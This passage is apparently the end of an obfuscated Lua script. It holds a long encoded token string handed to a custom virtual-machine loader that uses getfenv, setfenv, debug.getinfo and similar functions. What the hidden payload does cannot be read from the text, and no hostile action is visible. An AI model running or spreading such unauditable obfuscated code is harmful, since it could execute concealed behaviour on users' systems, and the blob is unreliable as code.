3QBG35LD3QBO3QBK3Q4G1V317V103Q6B3AN333C03I48317V34D03Q0M2KP3Q7T3AN33Q9Y3F923KN73ADO26D3Q8033KM3QBG1C3PE73B8H319135W03NLA3KND27B3KE73KS73Q6E3OHM36IF3KT53PTS3QCP3PKG34Q83AEL317V3QCJ3ORK3QCL27A3KE73QC13QAX3NWS21O3QBX2KP33C03G3K317V3NWU33WY2LE3QCZ3NX0334Z326U3KE73KSG3KSL3PKR21P3QBX2SI33C036163MIX3P1B33WY2KP34G633M23KAJ33AJ374G35NB34RP31B62SI3QDX3PW835KU33142SI34RP34TI31B63PW93A0X3LQ23QD13J9934TI3O7W3KMS35J132K633C03DLR3NM039CZ3MXL36B735J12PZ34TI35OG33273MXW331V340834VD3A07356X3QC73QAR363J346G3Q6W34X136WD3FIH3QAS3NWJ346G32ZS3CF733UE346G22F3QBP34G33QFK3ILG3MKT3NAW3QEC3OJO334V35J1332W3GVQ3NBT21G3QBX3M3G3GYA3LST3PML3AEL3KDC3CUU332W3IFW356X3QBB2S73HSZ31JK3A5538RO33UE33GF22N3QFL366M3QBP336N32K63GOK34HC3QCE310435143QER336F21H3QBX336F33C0355G3GYW3GOK33CP35143CP83DTC3PNH3HSZ34G32293QGQ35QD3QER33GF21E3QBX33GF33C03COY336N332W3KF535HO2H134503QH533WF3H343JYJ33GF35DT35BJ3LT6340M3Q8M3QAY32ZW31Z33LC838TY3QCF35QD21F3PUT34082H136YJ3L6E3Q323H2O3QFD2S735QX3HRA3KFE3QF0350N364Z3QIB3LQZ3KCT3FWV3KA03HN73QI4332W37283QHV3J263QIM3QAZ356X3QIE3Q9M2BO33WF3KFN3QIJ336F334L3QIX3FJ03QJ03CC633113PE7336F3QIU3408336F3E94356X3Q8533WF3KFX3LJN3M7Y33RZ3QBX334333C03CPE35BJ35323KSK2M02S73KFR3QF632O03PDK3CPE3LIB3QJO21B3QJQ3DKE3QJT34083532336L3QJX37V93EOJ3QFD31Z335203QK33NZT2183QK73QJS3CUU353235UC3QKD3IJ43QID3QI03QK227B3QK43N0E36UK3QKM3GYK3QJU3DF53QHX3QKE3QIO3QKG3QKV3KG53NZT2163QL03FYP3QL235TH3QKR3GRG3QL63QKU3QKI3QKW3NZT33WK35J13QJR3QL13QKA38H93QL43QKS3QKF3QLJ3NZQ3QKX33432143QLC3NZQ3QL23K7D3QLG3QJZ3QIZ3QLW3QKJ3MMK3CU13QLO3QK83QKO37ML33293QJY3QJ93QM83QLL3MMK348433BH3QLP3QLD3QLR3K7K3QMG3QL53KA03QL73QLK3QL93MMK3KNJ3QMC3QKN3DS735323HGV356X3QM63QHY27D3QKH3QLX3NZT2103QM13QK93GYM3IBQ3QM53QMI3QK13QMW3OUH3PNB2113QND3QME37KM3QNH3QKT3QNJ3QNA3MMK3CH33QN03QLQ3GYM336W3QNR3QLV3QNT3QM93OKM3CU73QNO3QN23GYW3QLT3QLH3QMU3QMJ3QMX3QO51W3QO73A3E353239583QO13QLI3QO33QMK3QO51X3QOH3QL235323QOA3QN63L4F339P3QL83QNL3QJO33AB3QNX3QMP3GYM36Q835VY3QOV3HLG3QN83QOY3QLY366J3QOR3QLR36H83QOL3QOC3QON3QOE3PNB22K3QPD3GYM33YU3QIM3QP73QIP3DJJ34E03QN93QO43PNB22L3QPM353233AM36YX3QMH3QNS3EOJ3QPT3QPA3NZT354F3QP23QM23QLR33VV33Z73QQ23QO23QQ43QOD3QOZ3QKY22J3QPY3CHU3QQ13QMT3DJJ3QJA356N3QPU3QOO3PNB22G3QQL3IBD3QPP3QNI3QQG3QPI3QQI334322H3QQL36643QQY3QQ33QIO3QQ53QNK3QPB22E3QQL3L7P3QPG3QQP3QQH3QPB22F3QQL33063QOU3QQZ3QP93QRB3NZT22C3QQL3I2A3QN53QRO3QOX3QRQ3MMK22D3QQL3H903QRG3QK02BO3QQS3QPJ3QJO22A3QQL36G93QS33QM73QR13QPB22B3QQL35JW3QSC3QN73QRX3QNU3QO534HV3QQ93QNE353233WF3QRN3QR83QSL3QPV3QJO2293QQL35J73QSJ3QOW28N3QQ63MMK331X3QSP3QME3CSF3QST3QQF3QRP3QSM3PNB34IT3QT73QO83JX13QT13QP83QSV3QQT3QJO2243QQL363S3QTA3QOM3QS53QT43QO52253QQL3CT63QTR3QPH3QTT3QRY3QO53KPE3QTG3QOI3DQW3QTZ3QRH3QSE3NZT2233QQL3HMB3QTJ3QPR27A3QS63QR237UR3QQL34393QU83QS43QTC3QSW3QKY2213QQL33LR3QUN3QSD3QU13QTD3QJO3PZC3QU53QL233MZ3QUF3QMV3QUY3QKY21Z3QQL36IL3QP63QRW3QT33QU23PNB3Q243QV13QLR32IQ3QUV3QSK3QVD3QV63N0M3QQL366N3QV43QRI3NZT21U3QQL33UJ3QMS3QLU3QTS3QUP3QTM3QKY21V3QQL33SG3QVR3QUA3MMK21S3QQL35M13QW63QUX3QUQ334321T3QQL34IV3QWC3QW03QS73QKY3JW335PK3QMO3QQA3GYM35943QVK3QT23QUH3QTU3PNB3KSV3QVH3GYM34HD3QWJ3QTL3QWL334323G3QQL35XB3QX23QVM3QWE3JBL3QQL31H83QWT3QTK3QXA3QW133433DWM3QMN3QMD3QO8341U3QX93QWV3QVE3QJO336U3KT53QWP3QSQ35LE3Q8E3QQO3QUO3QX33QUJ23C3QQL31TF3QXF3QUG33CF3QXR3QKY23D3QQL35KX3QXP3QY83QVN32SR3QQL36S83QRV3QSU3QXH3QX42BB3QQL3K9Y3QVX3QOB3QU93QWD3QXI38OK3QQL3KV13QY63QV53QXB3H7O3QWZ35322HX3QYZ3QVS3MMK335G3QZ31U3MLE3QZ63QW73QO52373QQL36RX3QYE3QUI3QPB2343QQL370Y3QZD3QYU3QYN31Z33QZA368M3QZJ3QWW3QJO3A1I3QWO3QXM3QU632GQ3QZP3QWK3QUJ2333QQL36JU3QYK3QTB3QY13QPB2303QQL3KXU3R033R0B3NZT3BJI3QZZ3QN13QU633W43R0G3QYM3QUJ3J2T3R0K3QNY35323MS73R0O3QXQ3QYG22Z3QQL3KRZ3R0W3QYF3QXB2OA3QZA35NO3QYR3QPQ3QZ03QYV3KR73QZA3KZE3R123QZK3NZT22U3QQL3KZS3R1F3QZW3QKY3KQI3QZA34L33R1L3QY9334322S3QQL35YH3QZV3R1S36TX3QQL3L0Q3R1R3QYG22Q3QQL369W3QVB3QYL3R0X3QXB22R3QQL35N73R1X3QYG22O3QQL349D3R223QXB35173QZA35M83R2E3QXB34FB3QZA3L2K3R2J3QYV24F3QQL369N3R2O3QYV24C3QQL34NR3R183QVC3R293QYV24D3QQL36SL3R2Y3QYN24A3QQL3L3M3R2T3QYN24B3QQL33R33R3F3QUJ3KV43QZA34AS3R3K3QPB2493QQL388X3R3P3NZT2463QQL34O73R3U3MMK2473QQL36L23R093QVZ3R0H3MMK2443QQL34LB3R333R283R133QYV2453QQL3N9R3R3Z3QO52423QQL348M3R4I3PNB2433QQL330W3R4N3QJO2403QQL35P73R3A3QUJ2413QQL34M03R4S3QKY23Y3QQL36B13PV33QXZ3QUW3QIO3QF5356X384X3GAJ3QZE3PNB23Z3QQL3KBM3R573QVY3QU03R5A3FJ03R5D3FJ73R353QYN23W3QQL360C3R5K3QYS3QY03DJJ3R5B2S73R5P3I8B3R1G3MMK23X3QQL37E435BL3QQE3R453R5Z3R5O3H2S3QZ73QO523U3QQL36K53R5W3R193FJ03R603KGX356X3QRA3QYG23V3QQL35OS3R6K3R343QF43R6D3H2O3R6Q3QXB3KU53QZA3NHA3R693R582S73R6N3KFF3R5E3R0A3R0P3QPB3KTS3QZA36A83R273EOJ3R783KG73R7A3R6B3R5R3QUJ23Q3QQL3KE43R6V3H2O3R7J3R62356N3QVL3R7N3QPB3KTA3QZA3K5Z3R753R5L3R6C3H2O3R7V34E03R7X3R4D3QYN23O3QQL3EKO3R7S3R7I3R6Y3QR03R7B3R7Y3NZT23P3QQL3NJZ3R833R5X3R6X3R863R6E3R4C3R643QO523M3QQL36UG3QR73R8G3R8U3R1M334323N3QQL3NLH3QQN3R8435VY3R7J3R1A3QYN23K3QQL24A372Y3R6A3KA03R9B3R6F3PNB23L3QQL3DOK3R903R5N3R923R1Y25A3QQL3CFZ3R983R8Q3R773R6W3R8V3PNB25B3QQL36M83R9Q3R9J3RA03R931U2583QQL3DFO3RA63R853R8J3R8A3QUJ2593QQL3NOY3R9X3QPQ3R9K3R5F3QJO2563QQL3KEA3QQD3R763QAX3R7M3RAH3QPB2573QQL3NQF3RAM3R6M3RA83R1Y3KX53QZA35QL3RAE3R9A3RB53QYG2553QQL3NR13RB33R7T3RBC3QXB2523QQL3NRS3RBH3EOJ3Q8Q3R893RA13QJO2533QQL3NSH3RBO3QIO3RBQ3QWU3RAY3NZT2503QQL361N3RBA356X3RBZ3QXG3R8K3MMK2513QQL33OO3RBX3KA03RC83QY73RBS3QKY24Y3QQL36LE3RC62S73RCH3R9C3QUJ24Z3QQL35Q33RCF3DJJ3RCQ3R9L3QJO24W3QQL3KEM3RCO3QDM3RAX3RCJ334324X3QQL35PO3RD43FCN3R5M3R463QO524U3QQL39OI3RDC3HM53RD63RA924V3QQL3NX73RCW35VY3RCY3RAP3QKY24S3QQL3NXU3RDR3RC73RBJ3QYV24T3QQL35GN3RDZ3RCP3RE13QYN24Q3QQL345W3RE63RD53RDE3R7C3NZT24R3QQL3NZ83RED3RDD3QYT3R043QPB2DJ3QZA351J3REL3RDL3REF3RCA3QO53KVY3QZA36WM3RAU3R993RE03R9S3QYG24M3QQL33KY3RET3RDT3QZQ3QUJ3KVI3QZA34RD3RDK3RFA3REO3NZT24K3QQL396C3R52334324L3QQL3KF23RFN3JWB3QQL3O223RFS24J3QQL34SB3RFS24G3QQL3L6K3RFS24H3QQL34SG3R4I3PZ9334334OW33M23PE7334326639NF310433433QDG33OG3QEH3KE733433CPE3LIN3PDX2673QBX33OG33C03CH13NDC3OUO3HLH3OUH3F3Q3RGV32ZW3KGE33D0332T3ECX2BO3KGR3L0N2V326433142V331SJ3G6P3DP23CEV3H2G3R6O3Q733FJ03IRX2S73KG635VY3DDQ3R5Y3KT73FJ03RH3356X3KGI3918334F33OU33WF3KGW3MP21U2653QI73DHL25238EB3RHR3QJJ3FJ03QIG35VY3PWE3G9W3FJ03RI13DJJ3KFX3DJJ3QIY31Z333433CR13DP434EB',{},40,2^16,{},"\115\116\114\105\110\103",'',string.byte,string.char,string.sub,table.concat,(math.ldexp or(function(a,b)return a*(2^b);end)),(getfenv or function()_ENV['\95\69\78\86']=_ENV;return _ENV end),setmetatable,select,next,math.floor,string.format,(unpack or table.unpack),tonumber,table.insert,string.gmatch,tostring,type,_VERSION,pcall,string.match,string.find,(debug.getinfo or debug.info),string.len,rawset,string.gsub,math.random,(table.find or function(a,b)for c,d in next,a do if d==b then return c;end;end return nil;end),rawget,_G,print,setfenv);end;
